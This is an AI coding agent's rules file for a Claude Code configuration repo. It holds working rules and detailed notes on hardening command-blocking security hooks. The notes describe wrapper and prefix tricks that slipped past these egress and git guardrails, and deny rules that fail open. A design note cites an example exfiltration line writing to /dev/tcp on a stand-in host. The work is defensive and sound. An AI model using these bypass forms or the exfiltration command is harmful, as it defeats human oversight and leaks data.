# Cardinal rules — universal, every project, every account

1. **Right-size every call.** Choose model + effort deliberately, per task — never inherit.
   Cheapest tier that gets it right; go broad-cheap before deep-expensive.
2. **Right tool for the exact job; parallel beats serial.** Two faces of the same rule:
   (a) deterministic beats LLM — script/query/type-check over a model call whenever it's
   exact; never spend an LLM call on what a lookup, a set/boolean predicate, a similarity
   score, or a vote/tally already decides (selection, grouping/clustering, dedup, parsing,
   routing — not just the obvious cases; try the dumbest deterministic version first —
   shared-key intersection before a similarity threshold, a threshold before a model
   judgment). (b) specialized beats generic — before grepping, hand-parsing, or reasoning
   manually, check whether a connected MCP/tool already does that exact job better (LSP
   for symbol/reference lookups over text search, semgrep for pattern/security scanning
   over ad-hoc regex, Grafana/observability MCPs for metrics over guessing, a platform's
   own API over scraping its output). Reach for the built-for-this tool by default, every
   session — an unused connected capability is a standing miss, not a neutral default. An
   orchestrator managing a nondeterministic model has no business being nondeterministic
   itself. Fan out independent work concurrently, not
   serially.
3. **Verify before you act — research is cheaper than a wrong call.** Ground truth (docs,
   API shape, live repro, shell/OS quirks) before executing anything hard to undo or that
   burns an external call. A failed assumption costs more than the minute of research would
   have — this is the whole lesson of the missed-API-call class of mistake.
4. **Bias to action, but keep it reversible.** Ship the boldest safe move and iterate; lean
   on git/branches/flags so mistakes stay cheap to undo. Don't dither, don't over-ask.
5. **Return fast; work async.** Keep the conversation unblocked — hand slow work to
   background agents/workflows, report outcomes, not play-by-play.
6. **Learn once, encode forever.** Diagnose root cause on every miss; fold the fix into an
   EXISTING rule/doc before adding a new one, or the list rots and you stop reading it.
7. **Persist durable knowledge to the repo, not chat.** Every decision/lesson/plan that
   should outlive this conversation goes to a file, via normal review — chat is ephemeral.
8. **Generalize the mechanism, not the symptom.** Fix root causes over special-casing.
   Delete/rewrite/regenerate freely — no ego, no sunk cost.
9. **Be exhaustive where it's cheap; stay minimal where it's not.** Mechanical sweeps (full
   coverage, every case) are free for a tireless worker — do them completely. Scope by
   DIFFICULTY not size: avoid ambiguous, open-ended design sprawl.
10. **One workstream per context.** Don't mix unrelated work in one long session — context
    degrades silently under summarization. Fresh session per domain; continuity lives in
    the repo/memory, not the thread.

## Dev-speed tactics (not rules — the concrete moves that make the above fast)
- Batch independent tool calls into one message; never poll in a loop — block on one
  `--watch`/`wait` call instead.
- Isolate parallel git mutators in detached scratch worktrees + explicit refspec pushes —
  never `git checkout` a branch that might be held by a stale worktree. (Re-verified #210: modern
  git — any version with `git worktree`, 2.5+ — makes this a loud `fatal: ... already used by
  worktree` error, exit 128, not the silent no-op earlier notes here claimed; the rule to avoid it
  stands regardless, since hitting that fatal error mid-sequence still wastes a turn re-diagnosing
  and re-planning around it.)
- Don't suppress a command's stderr if you might need it to diagnose — `2>/dev/null` on a
  step you'll have to re-debug just moves the cost, it doesn't remove it.
- Verify shell/OS assumptions before looping a command across N items (zsh glob rules ≠
  bash; macOS coreutils ≠ GNU) — one failed dry run beats N failed real ones.
- Prompt-cache long-lived context (this file, project CLAUDE.md) at the front of a
  session; don't re-paste large docs when a file reference will do.
- **Never put comments in a code snippet meant to be copy-pasted.** Strip all explanatory
  comments from any snippet the user will paste elsewhere — the explanation belongs in your
  surrounding prose, not in the pasted artifact.
- **Under `defaultMode: bypassPermissions`, only `permissions.deny` enforces** — `allow`/
  `autoMode.allow` are inert. Deny rules are anchored globs (not prefixes) that can't reliably
  constrain Bash arguments, and a plugin MCP deny must be `mcp__plugin_<plugin>_<server>__<tool>`
  or it silently fails open with no warning. Verify the matcher against the live tool surface
  before scoping any rule in `settings.json` (see `home/.claude/settings.README.md`).
- **A `hooks.PreToolUse` `matcher` string is a THIRD, separate gotcha from the two above** (#260,
  verified live against the Claude Code hooks docs): it's an unanchored regex whenever it contains
  any character outside `[A-Za-z0-9_\- ,|]`, but plain `mcp__<server>` (no regex metacharacter)
  contains ONLY those characters and so is evaluated as an exact string — it matches nothing, not
  "every tool from that server." To match a whole server (or every MCP tool) the pattern needs an
  explicit trailing `.*` after each `__` (`mcp__memory__.*`, or `mcp__.*__.*` for all servers/tools)
  — this is a different mechanism from `permissions.deny`'s glob syntax, so don't assume the two
  share a wildcard convention.
- **An issue-build branch can itself lag `origin/main`**, not just an issue's cited line
  numbers — when a sibling build merges first, the branch this build was cut from predates
  that merge. Before editing a shared file (e.g. `block-egress.py`, `tests/test_hooks.sh`),
  `git fetch origin main` and diff/rebase against it, then re-derive the fix from the
  rebased HEAD — otherwise you can reintroduce something a merged sibling already fixed, or
  hit an avoidable rebase conflict.
- **An assigned issue may already be fully fixed on HEAD** — a prior batch's squashed commit
  message can cite an issue number (`(#131)`) without using a `Closes #131`/`Fixes #131` keyword,
  so the issue never auto-closes even though the fix (and its test, usually citing the same
  number) already merged. Before reading deep into an issue, `grep -rn '#<N>'` across the repo —
  this codebase cites issue numbers in code comments and test descriptions pervasively, so an
  already-resolved issue usually self-documents in one grep instead of a full re-investigation.
  This has recurred across separate batches (#131/#152, then #169/#170) even after being
  documented once — when your own commit message resolves an issue, use `Closes #N`/`Fixes #N`
  (not just `(#N)`) so GitHub auto-closes it instead of leaving it to be rediscovered and
  re-investigated by a later build.
- **That same grep-HEAD check is blind to a sibling build's fix sitting in an OPEN, unmerged
  PR** (#190) — a merged commit shows up on a HEAD grep, but a concurrent builder session's
  branch doesn't merge until its PR lands, so an issue can already be fully resolved by an open
  PR while `grep -rn '#<N>'` on HEAD finds nothing. Before implementing an assigned issue, also
  run `gh pr list --state open` and check candidate PRs' bodies/commits (`gh pr view <n> --json
  body`, `gh pr diff <n>`) for that issue number, not just HEAD — this catches overlap a HEAD-only
  grep misses and avoids shipping a duplicate implementation that then conflicts at merge time.
- **Security issues can cite stale line numbers/rules.** The issue-authoring loop can snapshot
  an aggregate/planned state across several in-flight security PRs rather than HEAD, so a
  security issue's cited line numbers or its claim that a deny rule "already exists" may not
  match the live file. Re-derive the fix from `settings.json` at HEAD, never trust the issue's
  line refs or already-added claims at face value.
- **A security issue's cited code can live ONLY in an open, unmerged sibling PR — not on HEAD at
  all** (#265, cited `block-egress.py`'s `gh api graphql` mutation-detection carve-out, which
  only existed in PR #255's diff; #255 itself fail-closes on an unrelated finding and was never
  merged, so current `main` had no carve-out and the described bypass didn't exist on this branch
  until the carve-out was rebuilt). Don't assume an issue's cited function/branch exists on HEAD —
  if a grep for it comes up empty, check whether it's sitting in an open PR (`gh pr list --state
  open`, `gh pr diff <n>`) before concluding the issue is stale. If so, re-derive the whole
  feature from CURRENT HEAD, not from the stale PR's diff — HEAD can have moved past that PR's
  branch point (here, #271's short-flag bundling landed on `main` after #255 branched, so
  reusing #255's diff verbatim would have silently dropped that handling).
- **This bot's GitHub token is scoped to `SuxOS/claude-config` only** (#156) — a `suxbot[bot]`
  GitHub-App installation token (`ghs_…`): `gh api user` 403s and `gh repo view`/`gh api` against
  any OTHER SuxOS repo (e.g. `SuxOS/.github`) 404s, while this repo works. So an issue that says
  "copy/reference the pattern in another SuxOS repo" is UNBUILDABLE as worded — the referenced
  file's content must be pasted inline into the issue body, never left as a bare cross-repo link.
  File such issues with the content inline, and drop/flag any that only link out.
- **`block-egress.py` argv parsing is one canonicalization pass, not per-form branches** (#129):
  `strip_prefixes()` removes ALL leading prefixes (env-assign/sudo/wrappers) and `inline_payloads()`
  decomposes every bundled/glued/separate inline-flag shape in a single walk. A new bypass form
  (another tokenization edge case) should EXTEND that pass, never add a sibling branch — the
  per-form branch drip is exactly what caused #105/#115/#119/#120/#121/#126.
- **`strip_prefixes()` now lives in `_hookutil.py`, shared by every rail** (#193): `block-egress.py`
  had the only copy, so `block-sleep-loop.py`/`block-checkout-held-branch.py` independently compared
  `basename(argv[0])` with no prefix stripping and both re-acquired the wrapper-bypass bug
  (`command sleep 5`, `env git checkout held`, `sudo …`). Any NEW rail that reads a piece's command
  word must call `_hookutil.strip_prefixes()` on the argv first — never re-derive its own
  prefix/wrapper stripping, even a "just basename(argv[0])" shortcut.
- **`git_subcommand()`/`git_out()`/`git_returncode()` now live in `_hookutil.py` too** (#230), the
  same "hoist, don't duplicate" move as `strip_prefixes()` (#193): any rail that needs a `git`
  command's subcommand (past `-C`/`-c`/`--git-dir=`/etc.) or live repo state (status, merge-base,
  worktree list, ...) should call these instead of re-deriving its own git-argv walk or
  subprocess-wrapping — `git_out()` collapses a nonzero exit to `None` (for callers where the exit
  code is just a pass/fail marker), `git_returncode()` preserves it (for callers like `merge-base
  --is-ancestor` where the exit code IS the answer). A conservative-by-construction pattern worth
  reusing for any new git-consulting rail: resolve every ref/state check through one of these, and
  treat any `None`/unresolved result as "allow" — never "block" — so an unreadable repo or a git
  subprocess quirk degrades to a missed detection, never a false block.
- **A `git_returncode()` result with exactly two meaningful codes (e.g. `merge-base
  --is-ancestor`'s 0/1) must be tested for BOTH explicitly, not just `== 0`** (#339/#343): treating
  "not 0" as "definitely the other value" silently folds `None` and any other exit code (128 on a
  pruned/invalid object, a timeout, ...) into whatever branch handles the non-zero case instead of
  "unknown, skip" — same trap applies to a `git_out()`-backed helper, which collapses any failure
  to `None`, so a caller doing `bool(result)` instead of comparing against the specific expected
  value conflates "ran fine, found nothing" with "couldn't run." To build a real (not mocked)
  fixture for this class of test, `git reflog expire --expire=now --all && git gc -q --prune=now`
  on an already-unreachable commit turns its sha into a genuinely invalid git object —
  `merge-base`/`branch --contains` then fail with real nonzero exits instead of a synthetic error.
- **Extending `WRAPPERS` in `strip_prefixes()` can silently create a new false positive** (#179):
  a wrapper-shaped word may have an inspection-only flag that reports on the next word instead of
  executing it (`command -v curl` / `-V` prints curl's path, it never runs it). Blindly stripping
  through such a wrapper turns a safe, common idiom into a false block on the reported-about name —
  check for that mode and leave it unstripped before adding any new wrapper word.
- **A PreToolUse(Bash) hook that needs repo state must read `cwd` from the hook-input JSON and pass
  it to its git/subprocess calls** (#123, `block-checkout-held-branch.py`) — the hook process's own
  cwd isn't reliably the project dir, so inspecting `git worktree list`/branch without the input
  `cwd` reads the wrong repo. Fail open (exit 0) whenever that context can't be resolved.
- **Test hook JSON-shape logic against the real-shape corpus, not just synthetic JSON** (#117):
  the recurring hook bug class is mis-modeling the real Claude Code tool-input/transcript shape
  (#62/#80/#105/#108/#111/#112), and a hand-authored case in `tests/test_hooks.sh` shares the
  author's wrong guess so it can't catch a shape drift. Layer 3 drives each hook against redacted
  real-envelope fixtures under `tests/fixtures/` (its `README.md` documents capture/redact) — add
  a fixture there whenever a hook's shape assumptions change.
- **`install.sh` symlinks every entry under `home/.claude/` into `~/.claude/`** (except
  `settings.json`, which is copied because Claude Code rewrites it in place), so repo-/CI-only
  tooling must NOT live there or it lands in the user's live config — put linters, CI scripts,
  etc. under `.github/` instead. Adding a new
  required CI check also needs the main-branch ruleset AND `automerge.yml` `required-gates` updated
  in lockstep, or the automerge reusable refuses to arm (it verifies the ruleset first). Because of
  that, the config-integrity linters (settings/hooks/json/evals) run as STEPS INSIDE the one
  ruleset-required `shellcheck` job in `ci.yml` (#122), not as standalone jobs — that gates them on
  auto-merge with no ruleset change. Keep them folded there; splitting them back into their own jobs
  silently un-gates them until a human requires the new names in the ruleset. The INVERSE holds for a
  check that needs a secret or a model call (e.g. the `skill-evals` runner, #140): keep it a
  STANDALONE ADVISORY job — never fold it into `shellcheck` (that would make a cost/secret/flaky call
  a hard merge gate) — and have it skip cleanly (exit 0) when its secret/CLI is absent, so it stays a
  green no-op until a human enables it.
- **Dropping an issue mid-batch does not stop it from being auto-closed** (#148, #151, found
  investigating #184): the `issue-build.yml` reusable's PR body writes one `Closes #N` line per
  issue in the batch it was ASSIGNED, not the issues actually resolved by the final commit — if a
  builder drops an issue (per the REDUCE step) and the PR still merges, GitHub's keyword parser
  closes the dropped issue anyway, with no resolving commit. That workflow lives in the
  token-restricted `SuxOS/.github` repo, so it can't be fixed from here — when you drop an issue,
  say so plainly in your final message (as this file already asks) so a human notices; don't
  assume "released for retry" happens automatically.
- **A differential/property fuzzer must generate cases from an INDEPENDENT reference grammar, not
  from the production constant it's testing** (#199): `tests/fuzz_argv_canon.py`'s wrapper-flag
  cases are hand-authored from each tool's real docs, deliberately not read out of
  `_hookutil.WRAPPER_VALUE_OPTS`. Generating from that dict directly would have been tautological —
  the exact stdbuf `-o`/`-i`/`-e` gap it had (#198) would also have stopped the generator from ever
  producing a `stdbuf -o VAL cmd` case, so a self-referential fuzzer can't catch a gap in the very
  thing it draws cases from (it's how this harness also caught a live sibling gap in xargs's
  `-n`/`-s`/`-d` while being built). Keep a fuzzer's ground truth independent of its SUT's own
  bookkeeping whenever that bookkeeping is exactly what's under test.
- **When auditing a hand-picked value-flag set (`SUDO_VALUE_OPTS`/`GIT_GLOBAL_VALUE_OPTS`/
  `NPM_GLOBAL_VALUE_OPTS`-style sets) against a real CLI's full surface, check whether that CLI
  ships its own machine-readable flag definitions before hand-reading docs** (#287): npm's global
  config flags are enumerated with exact value-vs-boolean types in
  `@npmcli/config/lib/definitions/definitions.js`, requirable straight out of a local npm install
  (`node -e 'require("@npmcli/config/lib/definitions/definitions.js")'`) — this caught both the
  full value-taking surface AND the two genuinely ambiguous boolean-or-value flags (`--browser`/
  `--color`) that a docs skim could easily mis-classify either way. Prefer this over a doc-only
  audit whenever the tool has one; it's exhaustive and exact where docs are prose.
- **A predicate that recognizes an argv shape via exact list/token equality should first ask
  whether git's real grammar is a union/superset relation, not an intersection** (#319, #320, the
  same root mistake filed as two separate issues): `_push_dest_branch`/`_push_force_hit` read a
  bare `HEAD` refspec (no colon) as a literal branch named "HEAD" instead of resolving it, and
  `_checkout_discard_target`/`_restore_discard_target` required the pathspec list to equal exactly
  `["."]`, missing that `.` unions in ANY other pathspec (`git checkout -- . extra.txt` still
  discards everything). When auditing an exact-equality check (`x == [...]`, a literal ref/token
  compare) against a git argv shape, check whether "exactly this list" should really be "this
  token is present" or "this value resolves to X" before trusting the existing check.
- **This builder sandbox has outbound network access to public registries** (#322/#303): a `curl`
  to Docker Hub's or the npm registry's public API succeeds. Issue #303's own text assumed
  otherwise ("no network access to confirm a specific version tag exists") and left a `:latest`
  pin for "a human or a future build with live CI feedback" to fix — that assumption was wrong,
  not a real sandbox constraint. Before deferring a lookup (a digest, a release version, an
  upstream API shape) as unverifiable, try the live request first.
- **`pieces()`/`_split_pieces()` is shared by every rail, but its consumers don't all want the same
  view of a redirect** (#359): block-egress.py's `/dev/tcp` scan needs a redirect's TARGET token
  (`echo x > /dev/tcp/evil/443`) to survive in the yielded argv, while block-destructive-git.py's
  `_push_force_hit`/`_push_dest_branch` and block-checkout-held-branch.py's `checkout_target` need
  a redirect operator AND its target gone so it can't inflate their `len(positionals)` gates. Before
  changing what the shared BASE tokenizer yields, check every other caller of `pieces()`/
  `_split_pieces()` — if callers disagree about the wanted transformation, add an opt-in helper
  (`strip_redirects()`) that only the callers who want it apply, rather than baking the change into
  the shared base every rail gets.
- **A "live-verified" mapping doesn't need a live MCP session** (#348): the Cloudflare tool-name
  mapping in settings.README.md was already confirmed from the plugin's own `.mcp.json` and its
  upstream server's source/README, not from a connected `/mcp` session — that's an accepted
  verification tier here, not a stand-in for the real thing. `WebFetch`/`WebSearch` against a
  plugin's `.mcp.json` (find its repo path via `enabledPlugins` + `extraKnownMarketplaces` in
  settings.json) and the upstream MCP server's own docs can resolve a "needs live verification"
  issue the same way, without waiting for a connected session.
- **An investigation-only issue ("Issue #N looks already resolved") does not close itself once
  its target is fixed** (#296/#350, the same gap hit twice): #296 recommended closing #289 and is
  still open even though #289 was closed separately days ago — nothing re-checks or closes #296.
  When an issue's whole scope is "verify X, close it if stale," close BOTH the stale target and
  the investigation issue directly (`gh issue close`) once confirmed, rather than leaving either
  as a recommendation for a human to act on later.
- **A `WRAPPER_VALUE_OPTS`/`SUDO_VALUE_OPTS` entry assumes the flag's value is an OPAQUE token to
  skip past — verify that against the real tool's docs before adding one** (#227): `env`'s
  `-S`/`--split-string` broke that assumption silently for years of this table's history — its
  value isn't opaque at all, it IS (the start of) the real command, word-split by `env` itself and
  exec'd. Treating it like `-u`/`-C`'s skip-one-token model dropped the real command from every
  rail's view entirely. Before adding a new value-consuming flag to either table, check whether the
  tool's docs describe the value as a plain argument or as something that gets re-interpreted
  (split, expanded, re-exec'd) — the latter needs a splice-and-reprocess handler like
  `_hookutil._env_split_string()`, not a skip.
- **Changing a rail's internal helper SIGNATURE (not just its `check()` contract) can silently
  break `tests/fuzz_argv_canon.py`** (#241): that fuzzer calls some rail internals directly
  (`BLOCK_CHECKOUT.checkout_target(...)`) rather than only through the hook's stdin JSON contract
  `tests/test_hooks.sh` drives, so `test_hooks.sh` passing green does not prove the fuzzer still
  runs — it can fail with a plain `TypeError` instead. Before changing an internal function's
  signature (adding a required param like a `cwd` a new code path needs), `grep` the function name
  across `tests/fuzz_argv_canon.py` and update every direct call site too.

## The tools — locus, not a grammar
Work is organized by **where it happens** (workspace ⊃ org ⊃ repo), not by punctuation.
The tools detect the locus from cwd and adapt. See [`WORKFLOW.md`](../../WORKFLOW.md) for
the daily loop.

- **`orient`** — *see.* Read the current locus and report only what's off (this repo's
  state, or the cross-repo radar at org).
- **`work`** — *do.* Take the highest-value doable unit end-to-end, locally, now
  (worktree → code → verify → land). Self-heals local git jams.
- **`dispatch`** — *send.* Seed and control the autonomous `SuxOS/.github` three-loop
  pipeline (`hold`, cron toggle, file issues/PRs). Generic async is the built-in
  `schedule`/`Agent`, used directly — not re-wrapped.
- **`paste`** — format output for wherever it's going (email/Slack/GitHub/terminal).

Plain English is the whole surface — no marks, counts, or adverbs. "carefully work the
flaky auth tests across all repos" is a complete instruction. `~/.claude/fabric.json` is
the one declared truth (workspace root, orgs, repos, the pipeline pointer); the cloud
pipeline lives in `SuxOS/.github` and is never duplicated here.

**One recognized exception: scope operators.** Across every skill, `scope <op> <value>`
modifies the tool's *default* self-scope (its normal locus-derived resolution — e.g.
`work`'s "survey every clone in the org, pick the top unit") instead of replacing it with
free text:
- `scope+=X` — add X to the default scope (union)
- `scope-=X` — remove X from the default scope (exclusion)
- `scope=X` — set scope to exactly X (override, default doesn't apply)
`work org scope-=automation` means: this org's normal self-scope, minus anything
automation/pipeline-related — NOT "scope := automation" (that would need `scope=automation`).
Free-text hints (`work the flaky auth tests`) are still the norm everywhere else; this one
grammar exists because include/exclude is genuinely ambiguous in prose and worth a fixed
notation instead of guessing.
